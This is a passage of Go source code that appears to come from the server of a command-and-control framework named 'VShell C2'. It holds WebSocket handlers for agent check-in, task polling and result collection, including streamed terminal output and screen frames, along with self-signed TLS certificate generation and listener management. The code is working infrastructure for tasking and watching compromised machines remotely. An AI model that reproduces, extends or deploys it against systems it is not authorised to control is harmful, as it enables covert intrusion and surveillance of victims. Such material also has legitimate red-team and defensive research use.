	sessionID := GenerateSessionID(cl.ID)
	cl.mu.Lock()
	cl.sessions[sessionID] = &AgentSession{
		SessionID:   sessionID,
		ClientID:    client.ID,
		ListenerID:  cl.ID,
		RemoteAddr:  remoteAddr,
		ConnectedAt: time.Now(),
		LastSeen:    time.Now(),
	}
	cl.mu.Unlock()

	log.Printf("[WS:%d] Agent checked in: %s@%s (client %d)", cl.ID, checkin.UserName, checkin.HostName, client.ID)

	return &WSMessage{
		Type:      "checkin",
		ClientID:  client.ID,
		SessionID: sessionID,
		Status:    "ok",
		Message:   "registered",
		Data: mustMarshalJSON(map[string]interface{}{
			"interval": 5,
			"timeout":  30,
		}),
	}
}

// handleWSPoll returns pending tasks for a client over WebSocket
func (cl *C2Listener) handleWSPoll(clientID int64) *WSMessage {
	engine := GetEngine()

	// Update client last seen
	if client := engine.GetClient(clientID); client != nil {
		client.UpdateSeen()
	}

	// Update session last seen
	cl.mu.Lock()
	for _, sess := range cl.sessions {
		if sess.ClientID == clientID {
			sess.LastSeen = time.Now()
		}
	}
	cl.mu.Unlock()

	// Get pending tasks
	pendingTasks := engine.GetAndMarkPendingTasks(clientID)
	tasks := make([]map[string]interface{}, 0, len(pendingTasks))
	for _, t := range pendingTasks {
		tasks = append(tasks, map[string]interface{}{
			"id":      t.ID,
			"command": t.Command,
			"timeout": t.Timeout,
		})
	}

	if tasks == nil {
		tasks = []map[string]interface{}{}
	}

	return &WSMessage{
		Type:     "poll",
		ClientID: clientID,
		Data: mustMarshalJSON(map[string]interface{}{
			"tasks":    tasks,
			"interval": 5,
		}),
	}
}

// handleWSResult processes a task result submitted over WebSocket
func (cl *C2Listener) handleWSResult(msg *WSMessage) *WSMessage {
	engine := GetEngine()

	var result struct {
		CommandID int64  `json:"command_id"`
		Result    string `json:"result"`
		Status    string `json:"status"`
	}
	if err := json.Unmarshal(msg.Data, &result); err != nil {
		return &WSMessage{
			Type:    "error",
			Message: fmt.Sprintf("invalid result data: %v", err),
		}
	}

	status := result.Status
	if status == "" {
		status = "completed"
	}

	// Forward streaming results (terminal output / screen frames) to viewers.
	// Live data — don't store them as task records.
	if forwardStreamingResult(msg.ClientID, result.Result) {
		log.Printf("[WS:%d] streamed result from client %d", cl.ID, msg.ClientID)
	} else if err := engine.UpdateTask(result.CommandID, result.Result, status); err != nil {
		log.Printf("[WS:%d] Failed to update task %d: %v", cl.ID, result.CommandID, err)
	}

	return &WSMessage{
		Type:      "result",
		ClientID:  msg.ClientID,
		CommandID: result.CommandID,
		Status:    "ok",
		Message:   "received",
	}
}

// mustMarshalJSON is a helper that marshals to json.RawMessage, panicking on error
func mustMarshalJSON(v interface{}) json.RawMessage {
	data, err := json.Marshal(v)
	if err != nil {
		return json.RawMessage("{}")
	}
	return json.RawMessage(data)
}

// ============================================================================
// Health check handler
// ============================================================================

func (cl *C2Listener) handleHealth(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"status":   "ok",
		"listener": cl.ID,
		"mode":     cl.Config.Mode,
		"uptime":   time.Now().Unix(),
	})
}

// ============================================================================
// TLS certificate management
// ============================================================================

func (cl *C2Listener) loadOrGenerateTLS() (*tls.Certificate, error) {
	// Try to load existing certificate
	certFile := fmt.Sprintf("certs/listener_%d.crt", cl.ID)
	keyFile := fmt.Sprintf("certs/listener_%d.key", cl.ID)

	if cert, err := tls.LoadX509KeyPair(certFile, keyFile); err == nil {
		return &cert, nil
	}

	// Generate self-signed certificate
	return cl.generateSelfSignedCert()
}

func (cl *C2Listener) generateSelfSignedCert() (*tls.Certificate, error) {
	privateKey, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return nil, err
	}

	serialNumber, err := rand.Int(rand.Reader, big.NewInt(1<<62))
	if err != nil {
		return nil, err
	}

	template := x509.Certificate{
		SerialNumber: serialNumber,
		Subject: pkix.Name{
			CommonName:   fmt.Sprintf("vshell-listener-%d", cl.ID),
			Organization: []string{"VShell C2"},
		},
		NotBefore:             time.Now(),
		NotAfter:              time.Now().Add(365 * 24 * time.Hour),
		KeyUsage:              x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
		BasicConstraintsValid: true,
	}

	// Add SANs from listener address
	if cl.Config.ListenAddr != "" {
		host := strings.Split(cl.Config.ListenAddr, ":")[0]
		if host != "0.0.0.0" && host != "" {
			template.DNSNames = []string{host}
		}
	}
	template.DNSNames = append(template.DNSNames, "localhost")

	certDER, err := x509.CreateCertificate(rand.Reader, &template, &template, &privateKey.PublicKey, privateKey)
	if err != nil {
		return nil, err
	}

	certPEM := pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: certDER})
	keyPEM := pem.EncodeToMemory(&pem.Block{
		Type:  "RSA PRIVATE KEY",
		Bytes: x509.MarshalPKCS1PrivateKey(privateKey),
	})

	cert, err := tls.X509KeyPair(certPEM, keyPEM)
	if err != nil {
		return nil, err
	}

	// Save for future use
	os.MkdirAll("certs", 0755)
	certFile := fmt.Sprintf("certs/listener_%d.crt", cl.ID)
	keyFile := fmt.Sprintf("certs/listener_%d.key", cl.ID)
	os.WriteFile(certFile, certPEM, 0600)
	os.WriteFile(keyFile, keyPEM, 0600)

	Logf("Generated self-signed TLS certificate for listener %d", cl.ID)
	return &cert, nil
}

// ============================================================================
// Listener manager
// ============================================================================
// ListenerManager manages all active C2 listeners.
type ListenerManager struct {
	mu        sync.RWMutex
	listeners map[int64]*C2Listener
}

var listenerMgr = &ListenerManager{
	listeners: make(map[int64]*C2Listener),
}
// GetListenerManager returns the global listener manager.
func GetListenerManager() *ListenerManager {
	return listenerMgr
}
// StartListener creates and starts a C2 listener from configuration.
func (lm *ListenerManager) StartListener(config *Listener) error {
	lm.mu.Lock()
	defer lm.mu.Unlock()

	if _, exists := lm.listeners[config.ID]; exists {
		return fmt.Errorf("listener %d already active", config.ID)
	}

	cl := NewC2Listener(config)
	if err := cl.Start(); err != nil {
		return err
	}

	lm.listeners[config.ID] = cl
	return nil
}
// StopListener stops and removes a C2 listener.
func (lm *ListenerManager) StopListener(id int64) error {
	lm.mu.Lock()
	defer lm.mu.Unlock()

	cl, exists := lm.listeners[id]
	if !exists {
		return nil
	}

	if err := cl.Stop(); err != nil {
		return err
	}

	delete(lm.listeners, id)
	return nil
}
// GetListener returns an active C2 listener.
func (lm *ListenerManager) GetListener(id int64) *C2Listener {
	lm.mu.RLock()
	defer lm.mu.RUnlock()
	return lm.listeners[id]
}
// ListActive returns all active listener IDs.
func (lm *ListenerManager) ListActive() []int64 {
	lm.mu.RLock()
	defer lm.mu.RUnlock()

	ids := make([]int64, 0, len(lm.listeners))
	for id := range lm.listeners {
		ids = append(ids, id)
	}
	return ids
}
// StopAll stops all active listeners.
func (lm *ListenerManager) StopAll() {
	lm.mu.Lock()
	defer lm.mu.Unlock()

	for id, cl := range lm.listeners {
		cl.Stop()
		delete(lm.listeners, id)
	}
}
